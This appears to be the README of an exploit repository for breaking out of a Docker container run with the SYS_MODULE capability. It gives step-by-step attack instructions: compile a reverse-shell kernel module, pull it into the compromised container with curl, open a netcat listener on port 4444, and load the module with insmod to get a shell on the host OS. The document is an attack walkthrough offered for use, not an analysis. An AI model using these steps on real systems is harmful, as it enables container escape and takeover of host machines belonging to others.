# Docker-Breakout---Exploits

How can we exploit, When the container is running an image with --cap-add SYS_MODULE 

There are two files:

1) reverse-shell.c
2) makefile - make will run on the folder and compile and craete kernal module and other files

## Objective:

We are trying to listen inside the container to get a call back from kernal module since the container have SYS_MODULE capabiltiies 


## Step by step:


Attacker Machine:

Step 1: clone the repo

step 2: execute command 

```
make
```

step 3: now you will have .o and .ko files, .ko is kernal module, we will need this


Compromised Container 

Step 4: curl pull down the reverse-shell.ko file
step 5: setup a netcat listner 

```
nc -lvnp 4444
```

step 6: insert the kernal module 


```
insmod reverse-shell.ko
```


Now you will get the HOST OS on your netcat listener !!
